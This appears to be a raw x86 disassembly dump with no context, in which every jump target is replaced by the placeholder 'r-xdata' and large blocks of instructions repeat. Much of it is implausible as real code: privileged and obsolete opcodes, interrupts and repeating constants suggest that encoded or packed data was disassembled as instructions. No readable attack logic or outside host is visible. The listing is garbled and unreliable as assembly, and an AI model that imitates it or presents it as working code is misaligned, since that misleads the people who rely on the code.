arpl [ edx - 0x7b7b6344 ] dx
xchg edx eax
sub eax 0x922d5b11
ficom [ ecx - 0x14147b7c ]
jmp r-xdata
jpo r-xdata
test [ esi + 0x24 ] dl
xchg edx eax
jge r-xdata
jmp r-xdata
jmp r-xdata
clc
jpo r-xdata
xchg edx eax
jno r-xdata
je r-xdata
jbe r-xdata
xchg edx eax
jge r-xdata
jmp r-xdata
je r-xdata
test [ eax + ecx * 2 - 0x6d44014e ] al
salc
jno r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x9141415 ] al
aas
imul ebp [ ebx - 0x7b57046e ] 0xffffff84
jpo r-xdata
jmp r-xdata
jpo r-xdata
test [ esi ] cl
imul eax [ esp + ebp * 8 + 0x7b7b7b8f ] 0x24
and eax 0x7b7acf92
jpo r-xdata
iretd
jmp r-xdata
jpo r-xdata
or eax 0x8b3ef21d
and edx [ ecx ]
or ebx [ 0xffffffff92893ef2 ]
and [ ebp - 0x14147b7c ] ecx
je r-xdata
xor ecx ebp
test [ edx + eax * 2 - 0x18b90fa ] al
nop
cmpsb [ esi ] [ edi ]
test [ esi + esi * 8 - 0x7b794c02 ] al
test [ ebx ] ch
test [ 0x79b3f81f ] ch
jmp r-xdata
jmp r-xdata
jmp r-xdata
and al 0x25
xchg edx eax
iretd
mov ecx 0x9df09279
test [ ebx + ebp * 8 - 0x14141415 ] al
je r-xdata
xchg edx eax
and edi [ ebp + 0x7b ]
jmp r-xdata
jmp r-xdata
sub edx [ edx - 0x7b7b77a9 ]
jmp r-xdata
idiv dh
mov bl 0x86
test [ ebx + ebp - 0x7e0d27c ] al
mov bl 0x79
jmp r-xdata
jmp r-xdata
mov ebx 0x99f4ff74
test [ eax + ecx * 2 - 0x14474d45 ] al
jmp r-xdata
jmp r-xdata
or al 0x78
jpo r-xdata
je r-xdata
jmp r-xdata
int1
push 0x2d
xchg edx eax
jmp r-xdata
jpo r-xdata
test bl ch
jmp r-xdata
int 0xc0
test [ ebx + ebp * 8 + 0x3ebc2aeb ] al
xchg [ edx + 0x7b ] edi
jpo r-xdata
xchg edx eax
jmp r-xdata
jpo r-xdata
push 0xffffff85
test [ ebx + ebp * 8 - 0x38d90de3 ] al
xchg edx eax
ffreep st0
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub eax 0x84856a92
test bl ch
sbb eax 0x92c726f2
sub bh [ esi + edi + 0x7b7b7a87 ]
jmp r-xdata
jg r-xdata
jmp r-xdata
xchg edx eax
js r-xdata
je r-xdata
clc
mov edi 0xc1939263
test [ ebx + ebp * 8 + 0x23922eeb ] al
jge r-xdata
push ebp
into
test [ esi + edi * 8 + 0x7f4892bb ] al
jpo r-xdata
xchg edx eax
dec eax
jpo r-xdata
mov eax [ esp + eax * 4 + 0xf11ebeb ]
sbb eax 0x21d92ef2
xchg edx eax
sbb [ esi - 0x14147b7c ] edi
sub [ edx - 0x7b7b6863 ] dl
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
pop ebp
ja r-xdata
jno r-xdata
test [ edx + edx * 4 - 0x7b7b4cc3 ] al
jpo r-xdata
pop edi
outsd
test [ ebp - 0x7c ] cl
in al dx
xchg [ ebx + 0x7b ] edi
jpo r-xdata
xchg edx eax
jmp r-xdata
mov esp 0x7b7a873e
jpo r-xdata
insb
xchg ecx eax
test [ ebx + ebp * 8 - 0x7b7ecb6d ] al
test [ edx - 0x7b7b7369 ] dl
pop eax
mov al 0x84
test bl ch
jmp r-xdata
je r-xdata
not [ ebp - 0x3e6d7b7c ]
test [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
dec ebp
xchg edx eax
xchg ecx eax
cmpsb [ esi ] [ edi ]
popfd
xchg edi eax
test [ ebx + ebp * 8 + 0x74b840eb ] al
dec [ eax - 0x49 ]
test [ edx + edx * 4 - 0x7b7b7a91 ] al
jmp r-xdata
push ecx
cmp eax 0x748484b3
mov bl 0x7d
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
push es
ja r-xdata
sub_47be3a
or esi [ eax + 0x71928484 ]
jmp r-xdata
jpo r-xdata
js r-xdata
je r-xdata
clc
mov edi 0xc1939263
test [ ebx + ebp * 8 + 0x23922eeb ] al
jge r-xdata
jpo r-xdata
jpo r-xdata
pop ebp
ja r-xdata
jno r-xdata
test [ edx + edx * 4 - 0x7b7b4cc3 ] al
jpo r-xdata
jmp r-xdata
jpo r-xdata
je r-xdata
insb
xchg ecx eax
test [ ebx + ebp * 8 - 0x7b7ecb6d ] al
test [ edx - 0x7b7b7369 ] dl
sub eax 0x922d5b11
ficom [ ecx - 0x14147b7c ]
jmp r-xdata
jpo r-xdata
push 0xffffff85
test [ ebx + ebp * 8 - 0x38d90de3 ] al
xchg edx eax
pop eax
mov al 0x84
test bl ch
jmp r-xdata
je r-xdata
not [ ebp - 0x3e6d7b7c ]
test [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
push ecx
push ebp
into
test [ esi + edi * 8 + 0x7f4892bb ] al
jpo r-xdata
test [ esi + 0x24 ] dl
xchg edx eax
jge r-xdata
jmp r-xdata
jmp r-xdata
cmp eax 0x748484b3
mov eax [ esp + eax * 4 + 0xf11ebeb ]
sbb eax 0x21d92ef2
xchg edx eax
sbb [ esi - 0x14147b7c ] edi
sub [ edx - 0x7b7b6863 ] dl
jmp r-xdata
jmp r-xdata
clc
jpo r-xdata
xchg edx eax
jno r-xdata
je r-xdata
mov esp 0x7b7a873e
jbe r-xdata
xchg edx eax
jge r-xdata
jmp r-xdata
je r-xdata
test [ eax + ecx * 2 - 0x6d44014e ] al
salc
jno r-xdata
jmp r-xdata
cmp eax 0x4b3ff66f
arpl [ edx - 0x7b7b6344 ] dx
xchg edx eax
jmp r-xdata
xchg edx eax
test [ ebx + ebp * 8 - 0x9141415 ] al
aas
imul ebp [ ebx - 0x7b57046e ] 0xffffff84
jpo r-xdata
jmp r-xdata
jpo r-xdata
test [ esi ] cl
imul eax [ esp + ebp * 8 + 0x7b7b7b8f ] 0x24
and eax 0x7b7acf92
jpo r-xdata
iretd
jmp r-xdata
jpo r-xdata
or eax 0x8b3ef21d
and edx [ ecx ]
or ebx [ 0xffffffff92893ef2 ]
and [ ebp - 0x14147b7c ] ecx
je r-xdata
xor ecx ebp
test [ edx + eax * 2 - 0x18b90fa ] al
nop
cmpsb [ esi ] [ edi ]
test [ esi + esi * 8 - 0x7b794c02 ] al
test [ ebx ] ch
test [ 0x79b3f81f ] ch
jmp r-xdata
jmp r-xdata
jmp r-xdata
and al 0x25
xchg edx eax
iretd
mov ecx 0x9df09279
test [ ebx + ebp * 8 - 0x14141415 ] al
je r-xdata
xchg edx eax
and edi [ ebp + 0x7b ]
jmp r-xdata
jmp r-xdata
sub edx [ edx - 0x7b7b77a9 ]
jmp r-xdata
idiv dh
mov bl 0x86
test [ ebx + ebp - 0x7e0d27c ] al
mov bl 0x79
jmp r-xdata
jmp r-xdata
mov ebx 0x99f4ff74
test [ eax + ecx * 2 - 0x14474d45 ] al
jmp r-xdata
jmp r-xdata
or al 0x78
jpo r-xdata
int1
push 0x2d
xchg edx eax
jmp r-xdata
jpo r-xdata
test bl ch
jmp r-xdata
jpo r-xdata
int 0xc0
test [ ebx + ebp * 8 + 0x3ebc2aeb ] al
xchg [ edx + 0x7b ] edi
xchg edx eax
ffreep st0
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub eax 0x84856a92
test bl ch
sbb eax 0x92c726f2
sub bh [ esi + edi + 0x7b7b7a87 ]
jmp r-xdata
jg r-xdata
xchg edx eax
dec eax
jpo r-xdata
pop edi
outsd
test [ ebp - 0x7c ] cl
in al dx
xchg [ ebx + 0x7b ] edi
jpo r-xdata
xchg edx eax
jmp r-xdata
dec ebp
xchg edx eax
xchg ecx eax
cmpsb [ esi ] [ edi ]
popfd
xchg edi eax
test [ ebx + ebp * 8 + 0x74b840eb ] al
dec [ eax - 0x49 ]
test [ edx + edx * 4 - 0x7b7b7a91 ] al
jmp r-xdata
mov bl 0x7d
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
push es
ja r-xdata
sub_47be5a
jmp r-xdata
xchg edx eax
xchg ebx eax
rol [ esp + eax * 4 - 0x6dd11415 ] 0x23
test [ edx + edx * 4 - 0x7b7b4cc3 ] al
jpo r-xdata
je r-xdata
not [ ebp - 0x3e6d7b7c ]
test [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
je r-xdata
jmp r-xdata
cmp eax 0x748484b3
jmp r-xdata
jpo r-xdata
js r-xdata
je r-xdata
jge r-xdata
clc
mov edi 0xc1939263
test [ ebx + ebp * 8 + 0x23922eeb ] al
jpo r-xdata
jpo r-xdata
pop ebp
ja r-xdata
jno r-xdata
jmp r-xdata
jpo r-xdata
insb
xchg ecx eax
test [ ebx + ebp * 8 - 0x7b7ecb6d ] al
test [ edx - 0x7b7b7369 ] dl
sub eax 0x922d5b11
ficom [ ecx - 0x14147b7c ]
jmp r-xdata
jpo r-xdata
push 0xffffff85
test [ ebx + ebp * 8 - 0x38d90de3 ] al
xchg edx eax
pop eax
mov al 0x84
test bl ch
jmp r-xdata
push ecx
push ebp
into
test [ esi + edi * 8 + 0x7f4892bb ] al
jpo r-xdata
test [ esi + 0x24 ] dl
xchg edx eax
jge r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ esp + eax * 4 + 0xf11ebeb ]
sbb eax 0x21d92ef2
xchg edx eax
sbb [ esi - 0x14147b7c ] edi
sub [ edx - 0x7b7b6863 ] dl
jmp r-xdata
jmp r-xdata
clc
jpo r-xdata
xchg edx eax
jno r-xdata
je r-xdata
mov esp 0x7b7a873e
jbe r-xdata
xchg edx eax
jge r-xdata
jmp r-xdata
je r-xdata
test [ eax + ecx * 2 - 0x6d44014e ] al
salc
jno r-xdata
jmp r-xdata
cmp eax 0x4b3ff66f
arpl [ edx - 0x7b7b6344 ] dx
xchg edx eax
jmp r-xdata
xchg edx eax
test [ ebx + ebp * 8 - 0x9141415 ] al
aas
imul ebp [ ebx - 0x7b57046e ] 0xffffff84
jpo r-xdata
jmp r-xdata
jpo r-xdata
test [ esi ] cl
imul eax [ esp + ebp * 8 + 0x7b7b7b8f ] 0x24
and eax 0x7b7acf92
jpo r-xdata
iretd
jmp r-xdata
jpo r-xdata
or eax 0x8b3ef21d
and edx [ ecx ]
or ebx [ 0xffffffff92893ef2 ]
and [ ebp - 0x14147b7c ] ecx
je r-xdata
xor ecx ebp
test [ edx + eax * 2 - 0x18b90fa ] al
nop
cmpsb [ esi ] [ edi ]
test [ esi + esi * 8 - 0x7b794c02 ] al
test [ ebx ] ch
test [ 0x79b3f81f ] ch
jmp r-xdata
jmp r-xdata
jmp r-xdata
and al 0x25
xchg edx eax
iretd
mov ecx 0x9df09279
test [ ebx + ebp * 8 - 0x14141415 ] al
je r-xdata
xchg edx eax
and edi [ ebp + 0x7b ]
jmp r-xdata
jmp r-xdata
sub edx [ edx - 0x7b7b77a9 ]
jmp r-xdata
idiv dh
mov bl 0x86
test [ ebx + ebp - 0x7e0d27c ] al
mov bl 0x79
jmp r-xdata
jmp r-xdata
mov ebx 0x99f4ff74
test [ eax + ecx * 2 - 0x14474d45 ] al
jmp r-xdata
jmp r-xdata
or al 0x78
jpo r-xdata
int1
push 0x2d
xchg edx eax
jmp r-xdata
jpo r-xdata
test bl ch
jmp r-xdata
jpo r-xdata
int 0xc0
test [ ebx + ebp * 8 + 0x3ebc2aeb ] al
xchg [ edx + 0x7b ] edi
xchg edx eax
ffreep st0
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub eax 0x84856a92
test bl ch
sbb eax 0x92c726f2
sub bh [ esi + edi + 0x7b7b7a87 ]
jmp r-xdata
jg r-xdata
xchg edx eax
dec eax
jpo r-xdata
pop edi
outsd
test [ ebp - 0x7c ] cl
in al dx
xchg [ ebx + 0x7b ] edi
jpo r-xdata
xchg edx eax
jmp r-xdata
dec ebp
xchg edx eax
xchg ecx eax
cmpsb [ esi ] [ edi ]
popfd
xchg edi eax
test [ ebx + ebp * 8 + 0x74b840eb ] al
dec [ eax - 0x49 ]
test [ edx + edx * 4 - 0x7b7b7a91 ] al
jmp r-xdata
mov bl 0x7d
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
push es
ja r-xdata
sub_47be67
cmp eax 0x81859207
test [ ebx + ebp * 8 - 0x7b071415 ] al
push esi
and al 0x92
clc
jpo r-xdata
jbe r-xdata
xchg edx eax
jge r-xdata
jmp r-xdata
sub eax 0x922d5b11
ficom [ ecx - 0x14147b7c ]
jmp r-xdata
test [ ebx + ebp * 8 - 0x9141415 ] al
aas
imul ebp [ ebx - 0x7b57046e ] 0xffffff84
jpo r-xdata
jmp r-xdata
jpo r-xdata
test [ esi ] cl
imul eax [ esp + ebp * 8 + 0x7b7b7b8f ] 0x24
and eax 0x7b7acf92
jpo r-xdata
jge r-xdata
test [ esi + 0x24 ] dl
xchg edx eax
je r-xdata
xor ecx ebp
test [ edx + eax * 2 - 0x18b90fa ] al
nop
cmpsb [ esi ] [ edi ]
test [ esi + esi * 8 - 0x7b794c02 ] al
test [ ebx ] ch
test [ 0x79b3f81f ] ch
jmp r-xdata
jmp r-xdata
jmp r-xdata
and al 0x25
xchg edx eax
iretd
mov ecx 0x9df09279
test [ ebx + ebp * 8 - 0x14141415 ] al
je r-xdata
sub edx [ edx - 0x7b7b77a9 ]
jmp r-xdata
idiv dh
mov bl 0x86
test [ ebx + ebp - 0x7e0d27c ] al
mov bl 0x79
jmp r-xdata
jmp r-xdata
mov ebx 0x99f4ff74
test [ eax + ecx * 2 - 0x14474d45 ] al
jmp r-xdata
jmp r-xdata
or al 0x78
jpo r-xdata
jpo r-xdata
test bl ch
jmp r-xdata
int 0xc0
test [ ebx + ebp * 8 + 0x3ebc2aeb ] al
xchg [ edx + 0x7b ] edi
jpo r-xdata
xchg edx eax
sub bh [ esi + edi + 0x7b7b7a87 ]
jmp r-xdata
jg r-xdata
jmp r-xdata
xchg edx eax
js r-xdata
jmp r-xdata
push ebp
into
test [ esi + edi * 8 + 0x7f4892bb ] al
jpo r-xdata
xchg edx eax
dec eax
jpo r-xdata
mov eax [ esp + eax * 4 + 0xf11ebeb ]
sbb eax 0x21d92ef2
xchg edx eax
sbb [ esi - 0x14147b7c ] edi
sub [ edx - 0x7b7b6863 ] dl
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
pop edi
outsd
test [ ebp - 0x7c ] cl
in al dx
xchg [ ebx + 0x7b ] edi
jpo r-xdata
xchg edx eax
jmp r-xdata
mov esp 0x7b7a873e
jpo r-xdata
je r-xdata
insb
xchg ecx eax
test [ ebx + ebp * 8 - 0x7b7ecb6d ] al
test [ edx - 0x7b7b7369 ] dl
jmp r-xdata
dec ebp
xchg edx eax
xchg ecx eax
cmpsb [ esi ] [ edi ]
popfd
xchg edi eax
test [ ebx + ebp * 8 + 0x74b840eb ] al
dec [ eax - 0x49 ]
test [ edx + edx * 4 - 0x7b7b7a91 ] al
jmp r-xdata
push ecx
jpo r-xdata
mov bl 0x7d
jpo r-xdata
je r-xdata
clc
mov edi 0xc1939263
test [ ebx + ebp * 8 + 0x23922eeb ] al
jge r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
pop ebp
ja r-xdata
jno r-xdata
test [ edx + edx * 4 - 0x7b7b4cc3 ] al
jpo r-xdata
push es
ja r-xdata
jpo r-xdata
push 0xffffff85
test [ ebx + ebp * 8 - 0x38d90de3 ] al
xchg edx eax
pop eax
mov al 0x84
test bl ch
jmp r-xdata
je r-xdata
not [ ebp - 0x3e6d7b7c ]
test [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
cmp eax 0x748484b3
xchg edx eax
jno r-xdata
je r-xdata
je r-xdata
test [ eax + ecx * 2 - 0x6d44014e ] al
salc
jno r-xdata
jmp r-xdata
cmp eax 0x4b3ff66f
arpl [ edx - 0x7b7b6344 ] dx
xchg edx eax
iretd
jmp r-xdata
jpo r-xdata
or eax 0x8b3ef21d
and edx [ ecx ]
or ebx [ 0xffffffff92893ef2 ]
and [ ebp - 0x14147b7c ] ecx
xchg edx eax
and edi [ ebp + 0x7b ]
jmp r-xdata
jmp r-xdata
int1
push 0x2d
xchg edx eax
jmp r-xdata
ffreep st0
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub eax 0x84856a92
test bl ch
sbb eax 0x92c726f2
sub_47bef8
mov [ fs : esp + eax * 4 + 0x7b7db392 ] es
jpo r-xdata
clc
jmp r-xdata
jbe r-xdata
xchg edx eax
jge r-xdata
ja r-xdata
test [ ebx + ebp * 8 - 0x9141415 ] al
aas
imul ebp [ ebx - 0x7b57046e ] 0xffffff84
jpo r-xdata
jmp r-xdata
jpo r-xdata
je r-xdata
xor ecx ebp
test [ edx + eax * 2 - 0x18b90fa ] al
nop
cmpsb [ esi ] [ edi ]
test [ esi + esi * 8 - 0x7b794c02 ] al
test [ ebx ] ch
test [ 0x79b3f81f ] ch
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
sub edx [ edx - 0x7b7b77a9 ]
jmp r-xdata
idiv dh
mov bl 0x86
test [ ebx + ebp - 0x7e0d27c ] al
mov bl 0x79
jmp r-xdata
jmp r-xdata
mov ebx 0x99f4ff74
test [ eax + ecx * 2 - 0x14474d45 ] al
jmp r-xdata
test [ esi ] cl
imul eax [ esp + ebp * 8 + 0x7b7b7b8f ] 0x24
and eax 0x7b7acf92
jpo r-xdata
jpo r-xdata
test bl ch
jmp r-xdata
and al 0x25
xchg edx eax
iretd
mov ecx 0x9df09279
test [ ebx + ebp * 8 - 0x14141415 ] al
je r-xdata
sub bh [ esi + edi + 0x7b7b7a87 ]
jmp r-xdata
jg r-xdata
jmp r-xdata
or al 0x78
jpo r-xdata
jmp r-xdata
push ebp
into
test [ esi + edi * 8 + 0x7f4892bb ] al
jpo r-xdata
xchg edx eax
dec eax
jpo r-xdata
int 0xc0
test [ ebx + ebp * 8 + 0x3ebc2aeb ] al
xchg [ edx + 0x7b ] edi
jpo r-xdata
xchg edx eax
js r-xdata
sub [ edx - 0x7b7b6863 ] dl
jmp r-xdata
jmp r-xdata
pop edi
outsd
test [ ebp - 0x7c ] cl
in al dx
xchg [ ebx + 0x7b ] edi
jpo r-xdata
xchg edx eax
jmp r-xdata
xchg edx eax
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov esp 0x7b7a873e
jmp r-xdata
dec ebp
xchg edx eax
xchg ecx eax
cmpsb [ esi ] [ edi ]
popfd
xchg edi eax
test [ ebx + ebp * 8 + 0x74b840eb ] al
dec [ eax - 0x49 ]
test [ edx + edx * 4 - 0x7b7b7a91 ] al
jmp r-xdata
mov eax [ esp + eax * 4 + 0xf11ebeb ]
sbb eax 0x21d92ef2
xchg edx eax
sbb [ esi - 0x14147b7c ] edi
jpo r-xdata
je r-xdata
insb
xchg ecx eax
test [ ebx + ebp * 8 - 0x7b7ecb6d ] al
test [ edx - 0x7b7b7369 ] dl
push ecx
mov bl 0x7d
jpo r-xdata
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
je r-xdata
clc
mov edi 0xc1939263
test [ ebx + ebp * 8 + 0x23922eeb ] al
jge r-xdata
push es
pop ebp
ja r-xdata
jno r-xdata
test [ edx + edx * 4 - 0x7b7b4cc3 ] al
jpo r-xdata
sub eax 0x922d5b11
ficom [ ecx - 0x14147b7c ]
jmp r-xdata
jpo r-xdata
push 0xffffff85
test [ ebx + ebp * 8 - 0x38d90de3 ] al
xchg edx eax
pop eax
mov al 0x84
test bl ch
jmp r-xdata
je r-xdata
not [ ebp - 0x3e6d7b7c ]
test [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
test [ esi + 0x24 ] dl
xchg edx eax
jge r-xdata
jmp r-xdata
jmp r-xdata
cmp eax 0x748484b3
jpo r-xdata
xchg edx eax
jno r-xdata
je r-xdata
je r-xdata
test [ eax + ecx * 2 - 0x6d44014e ] al
salc
jno r-xdata
jmp r-xdata
cmp eax 0x4b3ff66f
arpl [ edx - 0x7b7b6344 ] dx
xchg edx eax
iretd
jmp r-xdata
jpo r-xdata
or eax 0x8b3ef21d
and edx [ ecx ]
or ebx [ 0xffffffff92893ef2 ]
and [ ebp - 0x14147b7c ] ecx
xchg edx eax
and edi [ ebp + 0x7b ]
jmp r-xdata
jmp r-xdata
int1
push 0x2d
xchg edx eax
jmp r-xdata
ffreep st0
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub eax 0x84856a92
test bl ch
sbb eax 0x92c726f2
sub_47bf17
sbb eax 0x92c12ef2
int 0xc0
test [ ebx + ebp * 8 + 0x3ebc2aeb ] al
xchg [ edx + 0x7b ] edi
jmp r-xdata
xchg edx eax
push ebp
into
test [ esi + edi * 8 + 0x7f4892bb ] al
jpo r-xdata
mov eax [ esp + eax * 4 + 0xf11ebeb ]
sbb eax 0x21d92ef2
xchg edx eax
sbb [ esi - 0x14147b7c ] edi
sub [ edx - 0x7b7b6863 ] dl
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov esp 0x7b7a873e
push ecx
sub_47bf74
clc
pop es
pop edi
outsd
jpo r-xdata
jmp r-xdata
test al 0xbf
mov [ esp + eax * 4 + 0x7b7db392 ] es
jpo r-xdata
jmp r-xdata
clc
jmp r-xdata
jmp r-xdata
jbe r-xdata
xchg edx eax
jge r-xdata
ja r-xdata
test [ ebx + ebp * 8 - 0x9141415 ] al
aas
imul ebp [ ebx - 0x7b57046e ] 0xffffff84
jpo r-xdata
jmp r-xdata
jpo r-xdata
je r-xdata
xor ecx ebp
test [ edx + eax * 2 - 0x18b90fa ] al
nop
cmpsb [ esi ] [ edi ]
test [ esi + esi * 8 - 0x7b794c02 ] al
test [ ebx ] ch
test [ 0x79b3f81f ] ch
jmp r-xdata
jmp r-xdata
jmp r-xdata
sub edx [ edx - 0x7b7b77a9 ]
jmp r-xdata
idiv dh
mov bl 0x86
test [ ebx + ebp - 0x7e0d27c ] al
mov bl 0x79
jmp r-xdata
mov ebx 0x99f4ff74
test [ eax + ecx * 2 - 0x14474d45 ] al
jmp r-xdata
test [ esi ] cl
imul eax [ esp + ebp * 8 + 0x7b7b7b8f ] 0x24
and eax 0x7b7acf92
jpo r-xdata
jpo r-xdata
test bl ch
jmp r-xdata
and al 0x25
xchg edx eax
iretd
mov ecx 0x9df09279
test [ ebx + ebp * 8 - 0x14141415 ] al
je r-xdata
sub bh [ esi + edi + 0x7b7b7a87 ]
jmp r-xdata
jg r-xdata
jmp r-xdata
or al 0x78
jpo r-xdata
jmp r-xdata
push ebp
into
test [ esi + edi * 8 + 0x7f4892bb ] al
jpo r-xdata
xchg edx eax
dec eax
jpo r-xdata
int 0xc0
test [ ebx + ebp * 8 + 0x3ebc2aeb ] al
xchg [ edx + 0x7b ] edi
jpo r-xdata
xchg edx eax
js r-xdata
sub [ edx - 0x7b7b6863 ] dl
jmp r-xdata
jmp r-xdata
pop edi
outsd
test [ ebp - 0x7c ] cl
in al dx
xchg [ ebx + 0x7b ] edi
jpo r-xdata
xchg edx eax
jmp r-xdata
xchg edx eax
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov esp 0x7b7a873e
jmp r-xdata
dec ebp
xchg edx eax
xchg ecx eax
cmpsb [ esi ] [ edi ]
popfd
xchg edi eax
test [ ebx + ebp * 8 + 0x74b840eb ] al
dec [ eax - 0x49 ]
test [ edx + edx * 4 - 0x7b7b7a91 ] al
jmp r-xdata
mov eax [ esp + eax * 4 + 0xf11ebeb ]
sbb eax 0x21d92ef2
xchg edx eax
sbb [ esi - 0x14147b7c ] edi
jpo r-xdata
je r-xdata
insb
xchg ecx eax
test [ ebx + ebp * 8 - 0x7b7ecb6d ] al
test [ edx - 0x7b7b7369 ] dl
push ecx
mov bl 0x7d
jpo r-xdata
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
je r-xdata
clc
mov edi 0xc1939263
test [ ebx + ebp * 8 + 0x23922eeb ] al
jge r-xdata
push es
pop ebp
ja r-xdata
jno r-xdata
test [ edx + edx * 4 - 0x7b7b4cc3 ] al
jpo r-xdata
sub eax 0x922d5b11
ficom [ ecx - 0x14147b7c ]
jmp r-xdata
jpo r-xdata
push 0xffffff85
test [ ebx + ebp * 8 - 0x38d90de3 ] al
xchg edx eax
pop eax
mov al 0x84
test bl ch
jmp r-xdata
je r-xdata
not [ ebp - 0x3e6d7b7c ]
test [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
test [ esi + 0x24 ] dl
xchg edx eax
jge r-xdata
jmp r-xdata
jmp r-xdata
cmp eax 0x748484b3
jpo r-xdata
xchg edx eax
jno r-xdata
je r-xdata
je r-xdata
test [ eax + ecx * 2 - 0x6d44014e ] al
salc
jno r-xdata
jmp r-xdata
cmp eax 0x4b3ff66f
arpl [ edx - 0x7b7b6344 ] dx
xchg edx eax
iretd
jmp r-xdata
jpo r-xdata
or eax 0x8b3ef21d
and edx [ ecx ]
or ebx [ 0xffffffff92893ef2 ]
and [ ebp - 0x14147b7c ] ecx
xchg edx eax
and edi [ ebp + 0x7b ]
jmp r-xdata
jmp r-xdata
int1
push 0x2d
xchg edx eax
jmp r-xdata
ffreep st0
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub eax 0x84856a92
test bl ch
sbb eax 0x92c726f2
sub_47bf87
inc ecx
mov eax [ esp + eax * 4 - 0xf68f17c ]
mov esp 0x848b5192
test bl ch
jmp r-xdata
dec ebx
jpo r-xdata
pushad
int 0x84
test dh dh
adc edi [ ebx + 0x6b ]
jpo r-xdata
sub [ edx - 0x7b7b6863 ] dl
jmp r-xdata
jmp r-xdata
push ecx
mov eax [ esp + eax * 4 + 0xf11ebeb ]
sbb eax 0x21d92ef2
xchg edx eax
sbb [ esi - 0x14147b7c ] edi
jmp r-xdata
sub_47bfa7
adc edi [ ebx + 0x4b ]
jpo r-xdata
pushad
int 0x84
test dh dh
adc edi [ ebx + 0x6b ]
jpo r-xdata
sub [ edx - 0x7b7b6863 ] dl
jmp r-xdata
jmp r-xdata
push ecx
mov eax [ esp + eax * 4 + 0xf11ebeb ]
sbb eax 0x21d92ef2
xchg edx eax
sbb [ esi - 0x14147b7c ] edi
jmp r-xdata
sub_47c0bd
mov [ 0xfffffffff21dbaf0 ] eax
mov eax [ 0xffffffffa892bdf0 ]
mov ebx 0xff748484
loope r-xdata
inc [ ebx - 0x40077b7c ]
ja r-xdata
test [ eax + edi * 8 - 0x6d8478fa ] al
test [ edi + edi * 8 - 0x1f ] dh
lodsd [ esi ]
sbb edx [ ecx - 0x38b8485 ]
jae r-xdata
jpo r-xdata
jmp r-xdata
test bl ch
jpo r-xdata
xchg edx eax
jpo r-xdata
jmp r-xdata
jmp r-xdata
sti
xchg edx eax
idiv [ ebp + 0x7a138484 ]
jpo r-xdata
adc eax [ ebx - 0x7b8484af ]
sub eax 0x5f274273
outsd
je r-xdata
dec eax
mov ebx 0x84aa2692
test bl ch
jmp r-xdata
jle r-xdata
xchg [ edx + 0x74ebebb8 ] esi
adc edi [ edx + 0x7b ]
test [ edx + edx * 4 + 0x7b7b7050 ] al
dec [ 0xffffffffc48484be ]
rcr [ edx ] cl
jpo r-xdata
or eax 0xc48484be
jmp r-xdata
test [ ebx + ebp * 8 - 0x43141415 ] al
xchg [ ebx + 0x7b ] edi
jpo r-xdata
imul edx [ es : edx - 0x7b7b45a7 ] 0xffffffeb
jmp r-xdata
jno r-xdata
xchg edx eax
jmp r-xdata
push 0xeb7b7b7f
[ ebx ]
[ edx + 0x74ebebb8 ] esi
mov ebp 0x84d56192
test bl ch
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
out 0x7b eax
push es
xchg [ ebx - 0x6e ] edi
jmp r-xdata
sbb al 0x98
test [ ebx + ebp * 8 - 0x7b42086e ] al
test [ ebx ] dl
jpe r-xdata
jmp r-xdata
popfd
xchg esi eax
test [ esp + esi * 2 - 0x7b516b01 ] al
mov al 0x84
test bl ch
jmp r-xdata
xchg edx eax
or edx [ eax - 0xde27b7c ]
mov [ edx - 0x7b7b6d6d ] edx
jmp r-xdata
jpo r-xdata
jmp r-xdata
xchg ebp eax
and [ 0xffffffff928b26f2 ] bl
test bl ch
jmp r-xdata
jpo r-xdata
adc edi [ ebx + 0x4b ]
mov [ 0xfffffffff2ebb8b2 ] eax
mov bl 0x92
adc eax edx
test [ ebx + ebp * 8 - 0x11091415 ] al
mov eax [ eax + 0x11928484 ]
jle r-xdata
jpo r-xdata
test [ edx + 0x7b7b7050 ] dl
xchg [ esp + eax * 4 - 0x1414147c ] edi
jmp r-xdata
movsd [ edi ] [ esi ]
test [ esp + ecx * 4 - 0x14474d5d ] al
mov bl 0x92
sub_47c0de
int 0x81
push eax
mov esp 0x848ca192
test bl ch
jmp r-xdata
xchg [ ebx - 0x6e ] edi
out 0x7b eax
jpo r-xdata
jpo r-xdata
jmp r-xdata
xchg edx eax
jpo r-xdata
jmp r-xdata
dec eax
mov ebx 0x84aa2692
test bl ch
jmp r-xdata
jle r-xdata
xchg [ edx + 0x74ebebb8 ] esi
adc edi [ edx + 0x7b ]
jmp r-xdata
test [ ebx + ebp * 8 - 0x43141415 ] al
xchg [ ebx + 0x7b ] edi
jpo r-xdata
